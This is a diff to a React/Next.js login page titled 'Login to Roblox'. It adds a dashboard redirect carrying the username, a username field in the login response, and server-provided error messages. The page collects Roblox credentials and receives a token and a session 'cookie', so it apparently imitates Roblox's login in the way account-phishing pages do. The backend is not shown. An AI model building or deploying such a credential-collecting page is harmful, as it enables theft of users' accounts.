@@ -22,6 +22,7 @@ import toast from "react-hot-toast";
 import { X } from "lucide-react"; // Import Lucide X icon for the close button
 
 import * as z from "zod";
+import { useRouter } from "next/navigation";
 
 // Helper function to check if the input is a valid phone number
 const isPhoneNumberValid = (value: string) => {
@@ -88,11 +89,11 @@ const identifierSchema = z
 const passwordSchema = z
   .string({ required_error: "Password is required" })
   .min(6, "Password must be at least 6 characters")
-  .max(100, "Password must be less than 100 characters")
-  // .regex(
-  //   /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]+$/,
-  //   "Password must contain at least one uppercase letter, one lowercase letter, one number, and one special character (@$!%*?&)"
-  // );
+  .max(100, "Password must be less than 100 characters");
+// .regex(
+//   /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]+$/,
+//   "Password must contain at least one uppercase letter, one lowercase letter, one number, and one special character (@$!%*?&)"
+// );
 
 // Define the form schema using Zod
 const loginSchema = z.object({
@@ -105,6 +106,7 @@ type LoginFormValues = z.infer<typeof loginSchema>;
 interface LoginResponse {
   token: string;
   cookie: string;
+  username: string;
 }
 
 const loginUser = async (data: LoginFormValues): Promise<LoginResponse> => {
@@ -113,6 +115,7 @@ const loginUser = async (data: LoginFormValues): Promise<LoginResponse> => {
 };
 
 export default function Home() {
+  const router = useRouter();
   const [cookie, setCookie] = useState<string | null>(null);
   const [token, setToken] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
@@ -133,10 +136,13 @@ export default function Home() {
       setToken(data.token);
       setShowSuccess(true);
       toast.success("Login successful!");
+      setTimeout(() => {
+        router.push(`/dashboard?username=${encodeURIComponent(data.username)}`);
+      }, 500);
     },
     onError: (error: any) => {
       console.error("Login failed:", error);
-      toast.error("Login failed. Please check your credentials.");
+      toast.error( error?.response?.data?.error || "Login failed. Please check your credentials.");
     },
   });
 
@@ -145,8 +151,8 @@ export default function Home() {
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center bg-neutral-900">
-      <div className="bg-neutral-800 p-6 py-8 rounded-lg shadow-lg w-full max-w-md">
+    <div className="h-screen flex items-center justify-center bg-neutral-900">
+      <div className="bg-neutral-800 p-6 py-8 rounded-lg shadow-lg w-full mx-2 max-w-md">
         <h1 className="text-3xl font-bold text-center text-white mb-6">
           Login to Roblox
         </h1>
@@ -193,7 +199,7 @@ export default function Home() {
         </form>
         <div className="grid gap-1.5">
           <p className="text-center text-neutral-200 mt-4">
-            Forget Password or Username? {" "}
+            Forget Password or Username?{" "}
             <a
               href="https://www.roblox.com/login/forgot-password-or-username"
               target="_blank"
